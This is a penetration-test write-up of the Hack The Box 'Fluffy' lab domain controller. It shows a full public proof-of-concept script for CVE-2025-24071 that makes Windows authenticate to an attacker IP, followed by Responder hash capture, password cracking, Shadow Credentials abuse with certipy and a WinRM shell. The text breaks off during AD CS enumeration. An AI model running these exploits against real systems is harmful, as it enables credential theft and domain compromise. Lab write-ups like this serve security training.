+++ 
title = "Fluffy-CPTS-Prep-Box Writeups" 
date = 2026-02-17T00:00:00Z
draft = false description = "Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided" 
tags = ["CPTS", "HTB", "Fluffy", "CPTS Prep", "Active Directory"] 
+++


## Executive Summary

During October 2025, a simulated penetration test was conducted against the domain controller `DC01.fluffy.htb` (the "Fluffy" box). The assessment began from an assumed breach scenario, providing the tester with low-privileged credentials for the domain user `j.fleischman`. The objective was to evaluate the potential impact of a compromised end-user workstation and identify escalation paths to full domain compromise.

The test successfully demonstrated a complete attack chain, moving from initial low-privileged access to domain administrator privileges by exploiting a combination of misconfigurations and recently disclosed vulnerabilities. The following key findings were identified:

- **Exploitation of CVE-2025-24071 (Windows File Explorer Spoofing):** Leveraging write access to the `IT` SMB share, the tester uploaded a specially crafted ZIP archive. When accessed by a domain user, this exploit triggered an SMB authentication attempt back to the attacker's machine, capturing the NTLMv2 hash for the user `p.agila`. This hash was successfully cracked, providing a new set of valid credentials.
    
- **Abuse of Insecure Access Control Lists (ACLs):** Using the new credentials for `p.agila`, BloodHound enumeration revealed that the user was a member of the `Service Account Managers` group. This group possessed `GenericAll` privileges over several service accounts, including `winrm_svc`, `ca_svc`, and `ldap_svc`.
    
- **Privilege Escalation via Shadow Credentials:** The `GenericAll` privilege over `winrm_svc` was abused using the Shadow Credentials attack. This allowed the tester to obtain the NT hash for `winrm_svc`, enabling persistent WinRM access to the target and the retrieval of the `user.txt` flag.
    
- **Domain Compromise via Active Directory Certificate Services (AD CS) Misconfiguration (ESC16):** Further analysis with the `ca_svc` credentials revealed a critical misconfiguration in the AD CS instance. The CA was vulnerable to **ESC16**, where the "Edit Flags" attribute lacked the `EDITF_ATTRIBUTESUBJECTALTNAME2` security extension. By modifying the `userPrincipalName` attribute of the `ca_svc` account to that of the `Administrator`, the tester was able to request a valid certificate for the built-in administrator account. This certificate was then used to authenticate and retrieve the Administrator's NT hash, leading to full control of the domain and the `root.txt` flag.
    

**Impact:**  
This chain of exploits resulted in a complete compromise of the Active Directory domain. An attacker starting with a standard user account was able to gain persistent, administrator-level access, demonstrating the critical risk posed by a combination of unpatched vulnerabilities, weak access controls, and misconfigured certificate services.

**Recommendations:**

- **Patch Management:** Apply the latest security patches immediately to remediate CVE-2025-24071.
    
- **Harden SMB Permissions:** Restrict write access to SMB shares, ensuring users can only write to directories specifically designated for their role.
    
- **Review and Harden ACLs:** Conduct a thorough review of all ACLs within Active Directory, removing overly permissive rights such as `GenericAll` from non-privileged groups and users.
    
- **Harden AD CS:** Immediately implement the security extension for the Certificate Authority to mitigate ESC16. Review all certificate templates for other common misconfigurations (ESC1, ESC8, etc.).


## Scope

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## About 


`Fluffy` is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the `winrm_svc` and `ca_svc` accounts. `WinRM` can then be used to log in to the target using the `winrc_svc` account. Exploitation of an Active Directory Certificate service (`ESC16`) using the `ca_svc` account is required to obtain access to the `Administrator` account.


### Details walkthrough 

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with an unrestricted port scan of the target (`10.129.232.88`) to identify all accessible services. Utilizing `nmap`, the tester performed a full TCP connect scan against all 65535 ports with service and default script enumeration enabled.

**Findings:** The scan revealed a standard Windows Domain Controller configuration. Key open ports included DNS (53/tcp), Kerberos (88/tcp), LDAP (389/tcp, 636/tcp), SMB (445/tcp), and WinRM (5985/tcp). The domain was identified as `fluffy.htb` with the hostname `DC01`

```bash
# Port scanning
nmap -sV -sC -p- 10..10.232.88
# Nmap 7.94SVN scan initiated Tue Oct 28 14:21:48 2025 as: nmap -Pn -sS -sVC -p- -oN nmap-Fluffy-28.10.2025 10.129.232.88
Nmap scan report for 10.129.232.88
Host is up (0.040s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 14:31:13Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:51+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:49+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:51+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T14:32:49+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49757/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-28T14:32:10
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

```



**2. Initial Access and Credential Validation**  
Operating under the assumed breach scenario, the tester validated the provided low-privileged credentials for the domain user `j.fleischman`. Using `netexec` (formerly `crackmapexec`), the credentials were tested against the SMB service to confirm domain access and enumerate available network shares.

```bash 
❯ netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
❯ netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share

```

**Findings:** The credentials were valid. The enumeration revealed a non-default share named `IT` where the user had both `READ` and `WRITE` permissions. This share was accessed via `smbclient` to retrieve its contents for offline analysis.

**3. Artifact Recovery and Analysis**  
Upon connecting to the `IT` share, the tester identified several installer archives (KeePass, Everything) and a PDF document titled `Upgrade_Notice.pdf`. This file was downloaded for further inspection.

```bash 
❯ smbclient //10.129.232.88/IT -U 'j.fleischman' -p 'J0elTHEM4n1990!'
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 28 21:30:04 2025
  ..                                  D        0  Tue Oct 28 21:30:04 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 22:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 22:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 22:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 22:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 21:31:07 2025

                5842943 blocks of size 4096. 1579442 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (23.5 KiloBytes/sec) (average 23.5 KiloBytes/sec)
```

**Findings:** The PDF contained a notice regarding a recently disclosed vulnerability, **CVE-2025-24071 (Windows File Explorer Spoofing)** . The document explicitly referenced the risks associated with this vulnerability, suggesting that the internal IT department was aware of the threat and potentially testing it.


``Details information about CVE-2025-24071  -Windows File Explorer Spoofing``
```python
CVE-2025-24071.py 

import os
import zipfile
import argparse
import time
import sys
import itertools
from colorama import init, Fore, Style

init()

def loading_animation(duration):
    """Display a simple loading animation for specified duration"""
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(f'\r{Fore.YELLOW}Processing {next(spinner)}{Style.RESET_ALL}')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r')

def print_ascii_art():
    """Print ASCII art banner"""
    art = r"""
          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __  
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ | 
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | | 
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | | 
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | | 
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_| 
                                                
                                                
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                                                                           
    """
    print(f"{Fore.CYAN}{art}{Style.RESET_ALL}")

def show_affected_versions():
    """Display list of affected versions"""
    affected_versions = [
        "Windows 10 Version 1809 for x64-based Systems",
        "Windows 10 Version 1809 for 32-bit Systems",
        "Windows Server 2025 (Server Core installation)",
        "Windows Server 2025",
        "Windows Server 2012 R2 (Server Core installation)",
        "Windows Server 2012 R2",
        "Windows Server 2016 (Server Core installation)",
        "Windows Server 2016",
        "Windows 10 Version 1607 for x64-based Systems",
        "Windows 10 Version 1607 for 32-bit Systems",
        "Windows 10 for x64-based Systems",
        "Windows 10 for 32-bit Systems",
        "Windows 11 Version 24H2 for x64-based Systems",
        "Windows 11 Version 24H2 for ARM64-based Systems",
        "Windows Server 2022, 23H2 Edition (Server Core installation)",
        "Windows 11 Version 23H2 for x64-based Systems",
        "Windows 11 Version 23H2 for ARM64-based Systems",
        "Windows 10 Version 22H2 for 32-bit Systems",
        "Windows 10 Version 22H2 for ARM64-based Systems",
        "Windows 10 Version 22H2 for x64-based Systems",
        "Windows 11 Version 22H2 for x64-based Systems",
        "Windows 11 Version 22H2 for ARM64-based Systems",
        "Windows 10 Version 21H2 for x64-based Systems",
        "Windows 10 Version 21H2 for ARM64-based Systems",
        "Windows 10 Version 21H2 for 32-bit Systems",
        "Windows Server 2022 (Server Core installation)",
        "Windows Server 2022",
        "Windows Server 2019 (Server Core installation)",
        "Windows Server 2019"
    ]
    print(f"{Fore.GREEN}Affected versions:{Style.RESET_ALL}")
    for version in affected_versions:
        print(f"- {version}")

def create_exploit(file_name, ip_address):
    print_ascii_art()
    print(f"{Fore.GREEN}Creating exploit with filename: {file_name}.library-ms{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Target IP: {ip_address}{Style.RESET_ALL}\n")

    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

    library_filename = f"{file_name}.library-ms"

    print(f"{Fore.BLUE}Generating library file...{Style.RESET_ALL}")
    loading_animation(1.5)
    try:
        with open(library_filename, 'w', encoding='utf-8') as f:
            f.write(library_content)
        print(f"{Fore.GREEN}✓ Library file created successfully{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}✗ Error writing file: {e}{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Creating ZIP archive...{Style.RESET_ALL}")
    loading_animation(1.5)
    try:
        with zipfile.ZipFile('exploit.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(library_filename)
        print(f"{Fore.GREEN}✓ ZIP file created successfully{Style.RESET_ALL}")
    except IOError as e:
        print(f"{Fore.RED}✗ Error creating ZIP file: {e}{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Cleaning up temporary files...{Style.RESET_ALL}")
    loading_animation(1.0)
    try:
        if os.path.exists(library_filename):
            os.remove(library_filename)
        print(f"{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}")
    except OSError:
        print(f"{Fore.RED}✗ Warning: Could not delete {library_filename}{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}Process completed successfully!{Style.RESET_ALL}")
    print(f"Output file: {Fore.YELLOW}exploit.zip{Style.RESET_ALL}")
    print(f"Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.")
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Create an exploit ZIP file or show affected versions')
    parser.add_argument('-f', '--file-name', 
                        help='Name of the library file (without extension)')
    parser.add_argument('-i', '--ip-address', 
                        help='IP address (e.g., 192.168.1.111)')
    parser.add_argument('-afv', '--affected-versions', action='store_true', 
                        help='Display affected versions')

    args = parser.parse_args()


    if not (args.file_name or args.ip_address or args.affected_versions):
        print(f"{Fore.RED}✗ Error: No arguments provided{Style.RESET_ALL}")
        parser.print_help()
    
    elif args.affected_versions:
        show_affected_versions()
      
        if args.file_name and args.ip_address:
            print(f"\n{Fore.YELLOW}Proceeding with exploit creation...{Style.RESET_ALL}")
            create_exploit(args.file_name, args.ip_address)
       
        elif args.file_name or args.ip_address:
            print(f"\n{Fore.RED}✗ Error: Both --file-name and --ip-address are required for exploit creation{Style.RESET_ALL}")
    
   
    else:
        if args.file_name and args.ip_address:
            create_exploit(args.file_name, args.ip_address)
        else:
            print(f"{Fore.RED}✗ Error: Both --file-name and --ip-address are required{Style.RESET_ALL}")
            parser.print_help() 

```

### Phase 2: Lateral Movement via CVE-2025-24071

**4. Exploit Preparation (CVE-2025-24071)**  
Based on the intelligence gathered from the PDF, the tester opted to exploit CVE-2025-24071. This vulnerability allows an attacker to craft a malicious `.library-ms` file within a ZIP archive. When extracted by Windows File Explorer, the file forces the target system to authenticate to a remote SMB server controlled by the attacker.

The tester utilized a public proof-of-concept (PoC) script to generate the malicious archive, specifying the name `whichuserauth` and the IP address of the attacker's machine (`10.10.16.6`).


``Create zip file and upload it to IT share and received NTLMv2 hash with Responder``
```bash
 python3 CVE-2025-24071.py -f whichuserauth -i 10.10.16.6

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|


                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)
                    by ThemeHackers                                                                                                              


Creating exploit with filename: whichuserauth.library-ms
Target IP: 10.10.16.6

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.

```

**5. Payload Deployment and Hash Capture**  
The resulting `exploit.zip` file was uploaded to the `IT` SMB share using the existing `j.fleischman` session.

```bash 
smb: \>
smb: \> put exploit.zip
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip putting file exploit.zip as \exploit.zip (1.0 kb/s) (average 1.0 kb/s)

```

Simultaneously, the tester started `Responder` on the attacking interface (`tun0`) to listen for and capture any incoming NTLMv2 authentication requests.

**Result:** Shortly after the file was placed in the share, `Responder` successfully captured an NTLMv2 hash for a different domain user: `p.agila`. This indicates that a user or automated process accessed the share and extracted the malicious archive.

```bash 
❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
   
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.6]
    Responder IPv6             [dead:beef:4::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LO25BT4VEVZ]
    Responder Domain Name      [HJXI.LOCAL]
    Responder DCE-RPC Port     [45904]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:5fa13cf1232a1356:0923FB511FC78CD8CC088BFF0AB720CC:0101000000<REDACTED> 63006900660073002F00310030002E00310030002E00310036002E0036000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[+] Exiting...

```


**6. Credential Cracking**  
The captured NTLMv2 hash was stored and subsequently cracked using `hashcat` with the `rockyou.txt` wordlist.

```bash 
❯ hashcat p.agila.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:5fa13cf1232a1356:0923fb511fc78cd8cc088bff0ab720cc:01010000000<REDACTED> 006900660073002f00310030002e00310030002e00310036002e0036000000000000000000:<REDACTED>

```

**Result:** The hash was successfully cracked, revealing the plaintext password `prometheusx-303` for the user `p.agila`.


### Phase 3: Internal Enumeration and ACL Abuse

**7. Active Directory Enumeration with BloodHound**  
With a new set of valid credentials, the tester performed deep Active Directory enumeration. The `bloodhound-python` ingestor was used to collect data from the domain controller, which was then loaded into the BloodHound GUI for analysis.

```bash 
bloodhound-python -c All -u P.AGILA -p <REDACTED>  -d fluffy.htb -dc DC01.fluffy.htb -ns 10.129.232.88 --zip
```


**Findings:**
- **Group Membership:** The user `p.agila` was a member of the `Service Account Managers` group.
    
- **Abusive ACEs:** The `Service Account Managers` group possessed **GenericAll** permissions over three principal service accounts: `winrm_svc`, `ca_svc`, and `ldap_svc`. GenericAll grants full control, allowing an attacker to modify the object's attributes at will.


**8. Escalating Privileges via Group Modification**  
To leverage the GenericAll permissions, the tester first needed to ensure `p.agila` was a member of the target group (`Service Account Managers`). While BloodHound indicated membership, the tester verified and added the user using `net rpc` to ensure the current session had the correct privileges.

```bash
bloodyAD -u p.agila -p <REDACTED>  -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts

certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account winrm_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c'
[*] Adding Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': <REDACTED> 

```

**9. Executing Shadow Credentials Attack**  
With effective control over the service accounts, the tester targeted `winrm_svc` using the Shadow Credentials attack. This technique allows an attacker with `GenericAll`/`GenericWrite` privileges to add a Key Credential (certificate) to the target user object. The tester used `certipy` to automate this process.

```bash 
❯ certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account winrm_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c'
[*] Adding Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'e3aaa63c-ea1e-6c37-b9fe-689613c6cd5c' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': <REDACTED> 

❯ certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account ca_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4d9bd5d9-c567-808f-a187-46824098f458'
[*] Adding Key Credential with device ID '4d9bd5d9-c567-808f-a187-46824098f458' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '4d9bd5d9-c567-808f-a187-46824098f458' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': <REDACTED> 


❯ certipy shadow auto -u p.agila@fluffy.htb -p <REDACTED>  -account ldap_svc
/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ldap_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3f841766-64b1-eaed-ee36-4581bf16f9db'
[*] Adding Key Credential with device ID '3f841766-64b1-eaed-ee36-4581bf16f9db' to the Key Credentials for 'ldap_svc'
[*] Successfully added Key Credential with device ID '3f841766-64b1-eaed-ee36-4581bf16f9db' to the Key Credentials for 'ldap_svc'
[*] Authenticating as 'ldap_svc' with the certificate
[*] Using principal: ldap_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ldap_svc.ccache'
[*] Trying to retrieve NT hash for 'ldap_svc'
[*] Restoring the old Key Credentials for 'ldap_svc'
[*] Successfully restored the old Key Credentials for 'ldap_svc'
[*] NT hash for 'ldap_svc': <REDACTED> 

```

**Result:** The attack successfully added a key credential, retrieved a TGT, and extracted the NT hash for `winrm_svc`. The process was repeated for `ca_svc` and `ldap_svc` to gather their hashes for potential future use.

**10. Establishing Foothold with WinRM**  
The newly acquired NT hash for `winrm_svc` was used to authenticate to the target via WinRM, providing an interactive shell on the domain controller.

```bash
❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H <REDACTED> 


Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop/
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/28/2025   7:12 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
<REDACTED> 
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>

```
The `user.txt` flag was successfully retrieved from the `winrm_svc` desktop, confirming successful lateral movement.

### Phase 4: Domain Privilege Escalation (AD CS Exploitation - ESC16)

**11. Certificate Service Enumeration**  
Using the credentials for `ca_svc`, the tester enumerated the Active Directory Certificate Services (AD CS) configuration to identify potential misconfigurations.


``Let's find vulnerable templates``
```bash
certipy find -u ca_svc@fluffy.htb -hashes <REDACTED>  -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
